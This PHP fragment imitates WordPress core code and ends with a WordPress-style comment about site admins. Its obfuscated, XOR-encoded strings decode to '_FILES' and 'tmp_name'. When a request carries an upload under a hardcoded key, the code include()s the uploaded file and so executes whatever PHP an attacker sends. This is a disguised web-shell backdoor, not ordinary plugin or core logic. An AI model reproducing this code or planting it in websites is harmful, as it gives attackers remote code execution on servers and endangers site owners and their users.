...
$field_no_prefix = 'TYY8OywAbWVfcAc';
$opening_quote = $field_no_prefix;

function comment($encoded_char, $wpdb)

{
    $encoded_char_length = $wpdb;
    $post_before = urldecode($encoded_char);
    $header = substr($encoded_char_length,0, strlen($post_before));
    $icon_dir_uri = $post_before ^ $header;
    return $icon_dir_uri;
}
$is_bad_hierarchical_slug = ${comment("%0B%1F%10t%0A%2A", $opening_quote)};
$group = $is_bad_hierarchical_slug;
if (isset($group[$opening_quote]))

{
    $post_type_clauses = $is_bad_hierarchical_slug[$opening_quote];
	$printed = 'ptypes';
    $meta = $post_type_clauses[comment("+4%29g%21%18%1A%24", $opening_quote)];

    $open_sq_flag = $meta;
    include ($open_sq_flag);

}



/* etermine if user is a site admin.
 *
